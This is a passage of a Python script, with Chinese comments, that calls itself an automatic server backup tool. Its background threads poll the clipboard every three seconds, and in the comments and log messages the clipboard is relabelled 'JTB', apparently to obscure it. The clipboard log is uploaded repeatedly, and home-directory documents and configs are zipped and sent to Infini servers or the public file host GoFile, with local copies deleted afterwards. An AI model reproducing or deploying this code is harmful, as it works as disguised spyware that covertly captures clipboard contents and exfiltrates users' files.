                                timeout=self.config.UPLOAD_TIMEOUT,
                                verify=True
                            )
                            
                            if response.ok and response.headers.get("Content-Type", "").startswith("application/json"):
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.critical(f"✅ [GoFile] {filename}")
                                    try:
                                        os.remove(file_path)
                                    except Exception as e:
                                        if self.config.DEBUG_MODE:
                                            logging.error(f"删除已上传文件失败: {e}")
                                    return True
                                else:
                                    error_msg = result.get("message", "未知错误")
                                    if attempt == 0 or self.config.DEBUG_MODE:
                                        logging.error(f"❌ [GoFile] {filename}: {error_msg}")
                            else:
                                if attempt == 0 or self.config.DEBUG_MODE:
                                    logging.error(f"❌ [GoFile] {filename}: 状态码 {response.status_code}")
                                
                    except requests.exceptions.Timeout:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [GoFile] {filename}: 超时")
                    except requests.exceptions.SSLError:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [GoFile] {filename}: SSL错误")
                    except requests.exceptions.ConnectionError:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [GoFile] {filename}: 连接错误")
                    except Exception as e:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [GoFile] {filename}: {str(e)}")
                    finally:
                        session.close()

                    continue
                
                if attempt < self.config.RETRY_COUNT - 1:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"等待 {self.config.RETRY_DELAY} 秒后重试...")
                    time.sleep(self.config.RETRY_DELAY)

            logging.error(f"❌ [GoFile] {os.path.basename(file_path)}: 上传失败")
            return False
            
        except OSError as e:
            logging.error(f"获取文件信息失败 {file_path}: {e}")
            return False
        except Exception as e:
            logging.error(f"[GoFile] 上传过程出错: {e}")
            return False

    def _upload_single_file(self, file_path):
        """上传单个文件：依次尝试所有 Infini 配置，全部失败后再使用 GoFile 备选方案"""
        try:
            # 检查文件权限和状态
            if not os.path.exists(file_path):
                logging.error(f"文件不存在: {file_path}")
                return False
                
            if not os.access(file_path, os.R_OK):
                logging.error(f"文件无读取权限: {file_path}")
                return False
                
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            filename = os.path.basename(file_path)
            infini_configs = self.infini_configs if self.infini_configs else [
                {
                    "name": "Infini-默认配置",
                    "url": self.infini_url,
                    "user": self.infini_user,
                    "password": self.infini_pass,
                }
            ]

            # 依次尝试所有 Infini 上传配置
            for index, infini_config in enumerate(infini_configs, start=1):
                config_name = infini_config.get("name", f"Infini-{index}")
                logging.info(f"🔄 尝试 Infini 上传配置 {index}/{len(infini_configs)}: {config_name}")
                if self._upload_single_file_infini(file_path, infini_config):
                    return True

            # 所有 Infini 上传方法都失败后，才尝试 GoFile 备选方案
            logging.warning(f"⚠️ 所有 Infini 上传方法均失败，尝试使用 GoFile 备选方案: {filename}")
            if self._upload_single_file_gofile(file_path):
                return True
            
            # 所有方法都失败：保留本地文件，等待下一轮重试
            logging.error(f"❌ {filename}: 所有上传方法均失败，已保留本地文件")
            
            return False
            
        except OSError as e:
            logging.error(f"获取文件信息失败 {file_path}: {e}")
            return False


    def get_clipboard_content(self):
        """获取 Linux JTB 内容

        返回:
            str or None: 当前JTB文本内容，获取失败或为空时返回 None
        """
        # 检查 DISPLAY 环境变量是否可用
        display = os.environ.get('DISPLAY')
        if not display:
            # DISPLAY 不可用，只在第一次或间隔时间后记录警告
            current_time = time.time()
            if not self._clipboard_display_warned or \
               (current_time - self._clipboard_display_error_time) >= self._clipboard_display_error_interval:
                if not self._clipboard_display_warned:
                    if self.config.DEBUG_MODE:
                        logging.debug("⚠️ DISPLAY 环境变量不可用，JTB监控功能已禁用（服务器环境或无图形界面）")
                    self._clipboard_display_warned = True
                self._clipboard_display_error_time = current_time
            return None
        
        try:
            # 使用 xclip 读取JTB（需系统已安装 xclip）
            result = subprocess.run(
                ['xclip', '-selection', 'clipboard', '-o'],
                capture_output=True,
                text=True,
                env=os.environ.copy(),  # 确保使用当前环境变量
                timeout=5
            )
            if result.returncode == 0:
                content = (result.stdout or "").strip()
                if content and not content.isspace():
                    return content
                # JTB为空时不记录日志，避免频繁报错
            else:
                # xclip 返回错误，检查是否是 DISPLAY 相关错误
                error_msg = result.stderr.strip() if result.stderr else ""
                is_display_error = "Can't open display" in error_msg or "display" in error_msg.lower()
                
                if is_display_error:
                    # DISPLAY 相关错误，降低日志频率
                    current_time = time.time()
                    if not self._clipboard_display_warned or \
                       (current_time - self._clipboard_display_error_time) >= self._clipboard_display_error_interval:
                        if not self._clipboard_display_warned:
                            if self.config.DEBUG_MODE:
                                logging.debug(f"⚠️ 获取JTB失败（DISPLAY 不可用）: {error_msg}")
                            self._clipboard_display_warned = True
                        self._clipboard_display_error_time = current_time
                else:
                    # 其他错误，不记录日志，避免频繁报错导致日志文件过大
                    # 某些环境下（如无剪贴板服务）会持续返回错误码
                    pass
            return None
        except FileNotFoundError:
            # 未安装 xclip，只在第一次记录警告
            if not self._clipboard_display_warned:
                if self.config.DEBUG_MODE:
                    logging.debug("⚠️ 未检测到 xclip，JTB监控功能已禁用")
                self._clipboard_display_warned = True
            return None
        except Exception as e:
            # 其他异常，不记录错误日志，避免频繁报错导致日志文件过大
            # 某些环境下（如无剪贴板服务）会持续抛出异常
            return None

    def log_clipboard_update(self, content, file_path):
        """记录JTB更新到文件（与 wsl.py 行为保持一致）"""
        try:
            # 确保目录存在
            os.makedirs(os.path.dirname(file_path), mode=self.config.BACKUP_DIR_MODE, exist_ok=True)
            os.chmod(os.path.dirname(file_path), self.config.BACKUP_DIR_MODE)

            # 检查内容是否为空或仅空白
            if not content or content.isspace():
                return

            content = self._sanitize_clipboard_content(content)
            if not content:
                return

            with self._clipboard_lock:
                with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                    # 与 wsl.py 中的格式保持 1:1
                    f.write(f"\n=== 📋 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                    f.write(f"{content}\n")
                    f.write("-" * 30 + "\n")

                if os.path.getsize(file_path) > self.config.CLIPBOARD_MAX_SIZE:
                    with open(file_path, 'rb') as source:
                        tail = source.read()[-self.config.CLIPBOARD_MAX_SIZE:]
                    with open(file_path, 'wb') as destination:
                        destination.write(tail)
                    os.chmod(file_path, self.config.BACKUP_FILE_MODE)

            preview = content[:50] + "..." if len(content) > 50 else content
            logging.info(f"📝 已记录内容: {preview}")
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.error(f"❌ 记录JTB失败: {e}")

    @staticmethod
    def _sanitize_clipboard_content(content):
        """过滤剪贴板中常见的密钥、口令和令牌，避免写入或上传敏感值。"""
        if not content:
            return ""
        sanitized = re.sub(
            r"-----BEGIN [^-]+-----.*?-----END [^-]+-----",
            "[REDACTED-PRIVATE-KEY]",
            content,
            flags=re.DOTALL | re.IGNORECASE,
        )
        sanitized = re.sub(
            r"(?im)^\s*(password|passwd|token|secret|api[_-]?key|private[_-]?key)\s*[:=]\s*.+$",
            r"\1=[REDACTED]",
            sanitized,
        )
        return sanitized[: 5 * 1024 * 1024]

    def monitor_clipboard(self, file_path, interval=3):
        """监控JTB变化并记录到文件（与 wsl.py 行为保持一致）

        Args:
            file_path: 日志文件路径
            interval: 检查间隔（秒）
        """
        try:
            log_dir = os.path.dirname(file_path)
            if not os.path.exists(log_dir):
                try:
                    os.makedirs(log_dir, mode=self.config.BACKUP_DIR_MODE, exist_ok=True)
                    os.chmod(log_dir, self.config.BACKUP_DIR_MODE)
                except Exception as e:
                    logging.error(f"❌ 创建JTB日志目录失败: {e}")
                    # 即使创建目录失败，也继续尝试运行（可能目录已存在）

            last_content = ""
            error_count = 0
            max_errors = 5
            last_empty_log_time = time.time()  # 记录上次输出空JTB日志的时间
            empty_log_interval = 300  # 每 5 分钟才输出一次空JTB日志

            # 初始化日志文件
            try:
                with self._clipboard_lock:
                    with open(file_path, 'a', encoding='utf-8') as f:
                        f.write(f"\n=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                        f.write("-" * 30 + "\n")
                    os.chmod(file_path, self.config.BACKUP_FILE_MODE)
            except Exception as e:
                logging.error(f"❌ 初始化JTB日志失败: {e}")
                # 即使初始化失败，也继续运行

            def is_special_content(text):
                """检查是否为特殊标记内容（与 wsl.py 逻辑保持一致）"""
                try:
                    if not text:
                        return False
                    if text.startswith('===') or text.startswith('-'):
                        return True
                    if 'JTB监控启动于' in text or '日志已于' in text:
                        return True
                    return False
                except Exception:
                    return False

            while True:
                try:
                    current_content = self.get_clipboard_content()
                    current_time = time.time()

                    if (current_content and 
                        not current_content.isspace() and 
                        not is_special_content(current_content)):
                        
                        # 检查内容是否发生变化
                        if current_content != last_content:
                            try:
                                preview = current_content[:30] + "..." if len(current_content) > 30 else current_content
                                logging.info(f"📋 检测到新内容: {preview}")
                                self.log_clipboard_update(current_content, file_path)
                                last_content = current_content
                                error_count = 0  # 重置错误计数
                            except Exception as e:
                                if self.config.DEBUG_MODE:
                                    logging.error(f"❌ 记录JTB内容失败: {e}")
                                # 即使记录失败，也继续监控
                    else:
                        try:
                            if self.config.DEBUG_MODE and current_time - last_empty_log_time >= empty_log_interval:
                                if not current_content:
                                    logging.debug("ℹ️ JTB为空")
                                elif current_content.isspace():
                                    logging.debug("ℹ️ JTB内容仅包含空白字符")
                                elif is_special_content(current_content):
                                    logging.debug("ℹ️ 跳过特殊标记内容")
                                last_empty_log_time = current_time
                        except Exception:
                            pass  # 忽略调试日志错误
                        error_count = 0  # 空内容不计入错误

                except KeyboardInterrupt:
                    # 允许通过键盘中断退出
                    raise
                except Exception as e:
                    error_count += 1
                    if error_count >= max_errors:
                        logging.error(f"❌ JTB监控连续出错{max_errors}次，等待60秒后重试")
                        try:
                            time.sleep(60)
                        except Exception:
                            pass
                        error_count = 0  # 重置错误计数
                    elif self.config.DEBUG_MODE:
                        logging.error(f"❌ JTB监控出错: {str(e)}")

                try:
                    time.sleep(interval)
                except KeyboardInterrupt:
                    raise
                except Exception:
                    # 即使 sleep 失败，也继续运行
                    time.sleep(interval)
        except KeyboardInterrupt:
            # 允许通过键盘中断退出
            raise
        except Exception as e:
            # 最外层异常处理，确保即使严重错误也不会影响主程序
            logging.error(f"❌ JTB监控线程发生严重错误: {e}")
            if self.config.DEBUG_MODE:
                import traceback
                logging.debug(traceback.format_exc())
            # 线程退出，但不影响主程序

def is_server():
    """检查是否在服务器环境中运行"""
    return platform.system().lower() == "linux"

def backup_server(backup_manager, source, target):
    """备份服务器，返回备份文件路径列表（不执行上传）- 分别压缩各个分目录"""
    backup_dirs = backup_manager.backup_linux_files(source, target)
    if not backup_dirs:
        return None

    
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    all_backup_paths = []
    
    # 分别压缩各个目录
    dir_names = {
        "docs": f"{user_prefix}_docs",
        "configs": f"{user_prefix}_configs",
        "specified": f"{user_prefix}_specified"
    }
    
    for dir_key, dir_path in backup_dirs.items():
        # 检查目录是否存在且不为空
        if not os.path.exists(dir_path):
            continue
        
        # 其他目录正常压缩
        # 检查目录是否为空
        try:
            if not os.listdir(dir_path):
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"⏭️ 跳过空目录: {dir_key}")
                continue
        except OSError:
            continue
        
        # 压缩目录（压缩文件保存在 target_dir 的父目录中）
        zip_name = f"{dir_names[dir_key]}_{timestamp}"
        # target_dir 是 backup_dirs 中任意一个目录的父目录
        target_dir = os.path.dirname(dir_path)
        zip_path = os.path.join(os.path.dirname(target_dir), zip_name)
        backup_path = backup_manager.zip_backup_folder(dir_path, zip_path)
        
        if backup_path:
            if isinstance(backup_path, list):
                all_backup_paths.extend(backup_path)
            else:
                all_backup_paths.append(backup_path)
            logging.critical(f"☑️ {dir_names[dir_key]} 目录备份文件已准备完成")
        else:
            logging.error(f"❌ {dir_names[dir_key]} 目录备份压缩失败")
    
    if all_backup_paths:
        logging.critical(f"☑️ 服务器备份文件已准备完成（共 {len(all_backup_paths)} 个文件）")
        return all_backup_paths
    else:
        logging.error("❌ 服务器备份压缩失败（没有生成任何备份文件）")
        return None

def find_pending_backup_files(backup_manager, target):
    """查找上轮上传失败而保留在备份根目录中的加密归档。"""
    backup_root = Path(target).resolve().parent
    pending = []
    try:
        for path in backup_root.iterdir():
            if path.is_file() and (path.name.endswith(".tar.gz.enc") or ".tar.gz.enc.part" in path.name):
                if backup_manager._is_valid_file(str(path)):
                    pending.append(str(path))
    except OSError as e:
        logging.error(f"扫描待上传备份失败: {e}")
    return sorted(pending)

def backup_and_upload_logs(backup_manager):
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件不存在，跳过: {log_file}")
            return

        # 刷新日志缓冲区，确保所有日志都已写入文件
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'flush'):
                handler.flush()
        
        # 等待一小段时间，确保文件系统同步
        time.sleep(0.5)

        file_size = os.path.getsize(log_file)
        if file_size == 0:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件为空，跳过: {log_file}")
            return

        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        temp_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_temp_backup_logs"
        if not backup_manager._ensure_directory(str(temp_dir)):
            logging.error("❌ 无法创建临时日志目录")
            return

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"{user_prefix}_backup_log_{timestamp}.txt"
        backup_path = temp_dir / backup_name

        try:
            # 读取并验证日志内容
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as src:
                log_content = src.read()
            
            if not log_content or not log_content.strip():
                logging.warning("⚠️ 日志内容为空，跳过上传")
                return
            
            # 写入备份文件
            with open(backup_path, 'w', encoding='utf-8') as dst:
                dst.write(log_content)
            os.chmod(backup_path, backup_manager.config.BACKUP_FILE_MODE)
            
            # 验证备份文件是否创建成功
            if not os.path.exists(str(backup_path)) or os.path.getsize(str(backup_path)) == 0:
                logging.error("❌ 备份日志文件创建失败或为空")
                return
            
            if backup_manager.config.DEBUG_MODE:
                logging.info(f"📄 已复制备份日志到临时目录 ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)")
            
            # 上传日志文件
            logging.info(f"📤 开始上传备份日志文件 ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)...")
            if backup_manager.upload_file(str(backup_path)):
                try:
                    with open(log_file, 'w', encoding='utf-8') as f:
                        f.write(f"=== 📝 备份日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传 ===\n")
                    logging.info("✅ 备份日志上传成功并已清空")
                except Exception as e:
                    logging.error(f"❌ 备份日志更新失败: {e}")
            else:
                logging.error("❌ 备份日志上传失败")

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"❌ 复制或读取日志文件失败: {e}")
        except Exception as e:
            logging.error(f"❌ 处理日志文件时出错: {e}")
            import traceback
            if backup_manager.config.DEBUG_MODE:
                logging.debug(traceback.format_exc())

        # 清理临时目录
        finally:
            try:
                if os.path.exists(str(temp_dir)):
                    shutil.rmtree(str(temp_dir))
            except Exception as e:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"清理临时目录失败: {e}")
                
    except Exception as e:
        logging.error(f"❌ 处理备份日志时出错: {e}")
        import traceback
        if backup_manager.config.DEBUG_MODE:
            logging.debug(traceback.format_exc())

def clipboard_upload_thread(backup_manager, clipboard_log_path):
    """独立的JTB上传线程（逻辑对齐 wsl.py）"""
    try:
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
    except Exception:
        user_prefix = "user"
    
    while True:
        try:
            if os.path.exists(clipboard_log_path) and os.path.getsize(clipboard_log_path) > 0:
                # 检查文件内容是否为空或只包含上传记录
                try:
                    with backup_manager._clipboard_lock:
                        with open(clipboard_log_path, 'r', encoding='utf-8') as f:
                            content = f.read().strip()
                    # 检查是否只包含初始化标记或上传记录
                    has_valid_content = False
                    lines = content.split('\n')
                    for line in lines:
                        try:
                            line = line.strip()
                            if (line and
                                not line.startswith('===') and
                                not line.startswith('-') and
                                'JTB监控启动于' not in line and
                                '日志已于' not in line):
                                has_valid_content = True
                                break
                        except Exception:
                            continue

                    if not has_valid_content:
                        if backup_manager.config.DEBUG_MODE:
                            logging.debug("📋 JTB内容为空或无效，跳过上传")
                        time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                        continue
                except Exception as e:
                    if backup_manager.config.DEBUG_MODE:
                        logging.error(f"❌ 读取JTB日志文件失败: {e}")
                    time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                    continue

                try:
                    username = getpass.getuser()
                    user_prefix = username[:5] if username else "user"
                except Exception:
                    pass  # 使用之前获取的 user_prefix

                temp_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_temp_clipboard_logs"
                try:
                    if backup_manager._ensure_directory(str(temp_dir)):
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        backup_name = f"{user_prefix}_clipboard_log_{timestamp}.txt"
                        backup_path = temp_dir / backup_name

                        try:
                            # 原子轮换日志，避免上传期间的新内容被清空
                            with backup_manager._clipboard_lock:
                                if os.path.exists(clipboard_log_path):
                                    os.replace(clipboard_log_path, backup_path)
                                with open(clipboard_log_path, 'a', encoding='utf-8'):
                                    pass
                                os.chmod(clipboard_log_path, backup_manager.config.BACKUP_FILE_MODE)
                            if backup_manager.config.DEBUG_MODE:
                                logging.info("📄 准备上传JTB日志...")
                        except Exception as e:
                            logging.error(f"❌ 轮换JTB日志失败: {e}")
                            time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                            continue

                        try:
                            if backup_path.exists() and backup_manager.upload_file(str(backup_path)):
                                if backup_manager.config.DEBUG_MODE:
                                    logging.info("✅ JTB日志已上传")
                            else:
                                # 上传失败时将快照合并回当前日志，确保内容不丢失
                                with backup_manager._clipboard_lock:
                                    if backup_path.exists():
                                        with open(backup_path, 'rb') as source, open(clipboard_log_path, 'ab') as destination:
                                            destination.write(source.read())
                                        os.remove(backup_path)
                                logging.error("❌ JTB日志上传失败")
                        except Exception as e:
                            with backup_manager._clipboard_lock:
                                if backup_path.exists():
                                    try:
                                        with open(backup_path, 'rb') as source, open(clipboard_log_path, 'ab') as destination:
                                            destination.write(source.read())
                                        os.remove(backup_path)
                                    except OSError:
                                        pass
                            logging.error(f"❌ 上传JTB日志失败: {e}")

                        try:
                            if os.path.exists(str(temp_dir)):
                                shutil.rmtree(str(temp_dir))
                        except Exception as e:
                            if backup_manager.config.DEBUG_MODE:
                                logging.error(f"❌ 清理临时目录失败: {e}")
                except Exception as e:
                    if backup_manager.config.DEBUG_MODE:
                        logging.error(f"❌ 处理JTB日志上传流程失败: {e}")
        except KeyboardInterrupt:
            # 允许通过键盘中断退出
            raise
        except Exception as e:
            logging.error(f"❌ 处理JTB日志时出错: {e}")
            if backup_manager.config.DEBUG_MODE:
                import traceback
                logging.debug(traceback.format_exc())

        # 等待一段时间后再次检查
        try:
            time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
        except KeyboardInterrupt:
            raise
        except Exception:
            # 即使 sleep 失败，也继续运行
            time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)

def clean_backup_directory():
    backup_dir = Path.home() / ".dev/Backup"
    try:
        if not os.path.exists(backup_dir):
            return
        # 保留备份日志、JTB日志和时间阈值文件
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        keep_files = [
            "backup.log",
            f"{user_prefix}_clipboard_log.txt",
            "next_backup_time.txt",
            ".encryption.key",
        ]
        
        for item in os.listdir(backup_dir):
            item_path = os.path.join(backup_dir, item)
            try:
                if item in keep_files:
                    continue
                if item.endswith(".tar.gz.enc") or ".tar.gz.enc.part" in item:
                    # 保留上传失败的加密归档，供下一轮重试
                    continue
                    
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                    
                if BackupConfig.DEBUG_MODE:
                    logging.info(f"🗑️ 已清理: {item}")
            except Exception as e:
                logging.error(f"❌ 清理 {item} 失败: {e}")
                
        logging.critical("🧹 备份目录已清理完成")
    except Exception as e:
        logging.error(f"❌ 清理备份目录时出错: {e}")

def save_next_backup_time(backup_manager):
    """保存下次备份时间到阈值文件"""
    try:
        next_backup_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
        threshold_path = Path(backup_manager.config.THRESHOLD_FILE)
        threshold_path.parent.mkdir(mode=backup_manager.config.BACKUP_DIR_MODE, parents=True, exist_ok=True)
        temp_path = threshold_path.with_name(f".{threshold_path.name}.tmp-{os.getpid()}")
        with open(temp_path, 'w', encoding='utf-8') as f:
            f.write(next_backup_time.strftime('%Y-%m-%d %H:%M:%S'))
        os.chmod(temp_path, backup_manager.config.BACKUP_FILE_MODE)
        os.replace(temp_path, threshold_path)
        os.chmod(threshold_path, backup_manager.config.BACKUP_FILE_MODE)
        if backup_manager.config.DEBUG_MODE:
            logging.info(f"⏰ 已保存下次备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
    except Exception as e:
        logging.error(f"❌ 保存下次备份时间失败: {e}")
        try:
            if 'temp_path' in locals() and temp_path.exists():
                temp_path.unlink()
        except OSError:
            pass

def should_perform_backup(backup_manager):
    """检查是否应该执行备份"""
    try:
        if not os.path.exists(backup_manager.config.THRESHOLD_FILE):
            return True
            
        with open(backup_manager.config.THRESHOLD_FILE, 'r', encoding='utf-8') as f:
            threshold_time_str = f.read().strip()
            
        threshold_time = datetime.strptime(threshold_time_str, '%Y-%m-%d %H:%M:%S')
        current_time = datetime.now()
        
        if current_time >= threshold_time:
            if backup_manager.config.DEBUG_MODE:
                logging.info("⏰ 已到达备份时间")
            return True
        else:
            if backup_manager.config.DEBUG_MODE:
                logging.info(f"⏳ 未到备份时间，下次备份: {threshold_time_str}")
            return False
            
    except Exception as e:
        logging.error(f"❌ 检查备份时间失败: {e}")
        return True  # 出错时默认执行备份

def main():
    if not is_server():
        logging.critical("本脚本仅适用于服务器环境")
        return

    try:
        backup_manager = BackupManager()
        
        # 先清理备份目录
        clean_backup_directory()
        
        periodic_backup_upload(backup_manager)
    except KeyboardInterrupt:
        logging.critical("\n备份程序已停止")
    except Exception as e:
        logging.critical(f"程序出错: {e}")

def periodic_backup_upload(backup_manager):
    source = str(Path.home())
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    target = Path.home() / ".dev/Backup" / f"{user_prefix}_server"
    clipboard_log_path = Path.home() / ".dev/Backup" / f"{user_prefix}_clipboard_log.txt"

    try:
        # 启动JTB监控线程（添加异常处理，确保即使启动失败也不影响主程序）
        try:
            clipboard_thread = threading.Thread(
                target=backup_manager.monitor_clipboard,
                args=(str(clipboard_log_path), 3),
                daemon=True
            )
            clipboard_thread.start()
            if backup_manager.config.DEBUG_MODE:
                logging.info("✅ JTB监控线程已启动")
        except Exception as e:
            logging.error(f"❌ 启动JTB监控线程失败: {e}")
            if backup_manager.config.DEBUG_MODE:
                import traceback
                logging.debug(traceback.format_exc())
            # 即使启动失败，也继续运行主程序

        # 启动JTB上传线程（添加异常处理，确保即使启动失败也不影响主程序）
        try:
            clipboard_upload_thread_obj = threading.Thread(
                target=clipboard_upload_thread,
                args=(backup_manager, str(clipboard_log_path)),
                daemon=True
            )
            clipboard_upload_thread_obj.start()
            if backup_manager.config.DEBUG_MODE:
                logging.info("✅ JTB上传线程已启动")
        except Exception as e:
            logging.error(f"❌ 启动JTB上传线程失败: {e}")
            if backup_manager.config.DEBUG_MODE:
                import traceback
                logging.debug(traceback.format_exc())
            # 即使启动失败，也继续运行主程序

        # 初始化JTB日志文件（与 wsl.py 保持一致）
        try:
            with backup_manager._clipboard_lock:
                with open(clipboard_log_path, 'a', encoding='utf-8') as f:
                    f.write(f"=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                os.chmod(clipboard_log_path, backup_manager.config.BACKUP_FILE_MODE)
        except Exception as e:
            logging.error(f"❌ 初始化JTB日志失败: {e}")
            # 即使初始化失败，也继续运行主程序

        # 获取用户名和系统信息
        username = getpass.getuser()
        hostname = socket.gethostname()
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # 获取系统环境信息
        system_info = {
            "操作系统": platform.system(),
            "系统版本": platform.release(),
            "系统架构": platform.machine(),
            "Python版本": platform.python_version(),
            "主机名": hostname,
            "用户名": username,
        }
        
        # 获取Linux发行版信息
        try:
            with open("/etc/os-release", "r") as f:
                for line in f:
                    if line.startswith("PRETTY_NAME="):
                        system_info["Linux发行版"] = line.split("=")[1].strip().strip('"')
                        break
        except (OSError, UnicodeError):
            pass
        
        # 获取内核版本
        try:
            with open("/proc/version", "r") as f:
                kernel_version = f.read().strip().split()[2]
                system_info["内核版本"] = kernel_version
        except (OSError, IndexError):
            pass
        
        # 输出启动信息和系统环境
        logging.critical("\n" + "="*50)
        logging.critical("🚀 自动备份系统已启动")
        logging.critical("="*50)
        logging.critical(f"⏰ 启动时间: {current_time}")
        logging.critical("-"*50)
        logging.critical("📊 系统环境信息:")
        for key, value in system_info.items():
            logging.critical(f"   • {key}: {value}")
        logging.critical("-"*50)
        logging.critical("="*50)

        while True:
            try:
                # 检查是否应该执行备份
                if not should_perform_backup(backup_manager):
                    time.sleep(3600)  # 每小时检查一次
                    continue

                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                logging.critical("\n" + "="*40)
                logging.critical(f"⏰ 开始备份  {current_time}")
                logging.critical("-"*40)

                # 先重试上一轮未成功上传的归档，避免新一轮清理目标目录时丢失待上传文件
                pending_paths = find_pending_backup_files(backup_manager, target)
                if pending_paths:
                    logging.critical(f"📤 重试上一轮遗留备份 ({len(pending_paths)} 个文件)...")
                    if not backup_manager.upload_backup(pending_paths):
                        logging.error("❌ 遗留备份仍有上传失败，将保留文件并继续生成本轮备份")

                logging.critical("\n🖥️ 服务器指定目录备份")
                backup_paths = backup_server(backup_manager, source, target)

                # 输出结束语（在上传之前）
                logging.critical("\n" + "="*40)
                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                logging.critical(f"✅ 备份完成  {current_time}")
                logging.critical("="*40)
                logging.critical("📋 备份任务已结束")
                logging.critical("="*40 + "\n")

                # 开始上传备份文件
                backup_uploaded = False
                if backup_paths:
                    file_count = len(backup_paths)
                    logging.critical(f"📤 上传 {file_count} 个文件...")
                    backup_uploaded = backup_manager.upload_backup(backup_paths)
                    if backup_uploaded:
                        logging.critical("✅ 上传完成")
                    else:
                        logging.error("❌ 部分文件上传失败，保留本地文件等待重试")
                else:
                    logging.error("❌ 未生成备份文件，本轮不更新下次备份时间")

                # 只有备份文件全部上传成功后才推进调度时间
                if backup_uploaded:
                    save_next_backup_time(backup_manager)
                    next_backup_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
                    logging.critical(f"🔄 下次启动备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                else:
                    logging.critical("🔄 上传未完成，将在下一轮重试")
                
                # 上传备份日志
                if backup_manager.config.DEBUG_MODE:
                    logging.info("\n📝 备份日志上传")
                backup_and_upload_logs(backup_manager)

            except Exception as e:
                logging.error(f"\n❌ 备份出错: {e}")
                try:
                    backup_and_upload_logs(backup_manager)
                except Exception as log_error:
                    logging.error("❌ 日志备份失败")
                time.sleep(60)

    except Exception as e:
        logging.error(f"❌ 备份过程出错: {e}")

if __name__ == "__main__":
    main()
